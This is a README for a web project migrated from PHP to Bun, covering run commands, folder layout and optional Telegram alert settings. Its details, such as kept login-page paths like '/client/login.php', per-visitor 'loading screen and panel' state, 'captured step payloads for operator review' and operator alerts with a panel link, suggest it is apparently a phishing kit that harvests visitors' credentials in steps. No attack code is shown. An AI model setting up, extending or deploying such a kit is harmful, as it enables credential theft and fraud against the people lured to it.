# Bun Migration

This project has been rewritten to run on Bun without PHP or Composer.

## Run

```bash
bun install
cp .env.example .env
bun run dev
```

Production:

```bash
bun run start
```

The app listens on `PORT` and `HOST` when provided.

## Structure

- `src/`: Bun server and route/template logic.
- `public/`: static assets preserved from the original project.
- `data/logs/`: per-visitor state files used by the loading screen and panel.
- `data/submissions/`: captured step payloads for operator review.

## Notes

- Route paths remain PHP-shaped, such as `/client/login.php`, so existing links keep working.
- Telegram notifications are optional and env-based. They send only session ID, step, timestamp, and panel link.
- Configure optional Telegram alerts with:

```env
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
APP_BASE_URL=https://your-hostname
```

- `APP_BASE_URL` is optional.
- If unset, the app builds links from the current request host and protocol.
- For local development, you can set:

```env
APP_BASE_URL=http://localhost:3000
```

- For production, use your deployed origin:

```env
APP_BASE_URL=https://your-hostname
```

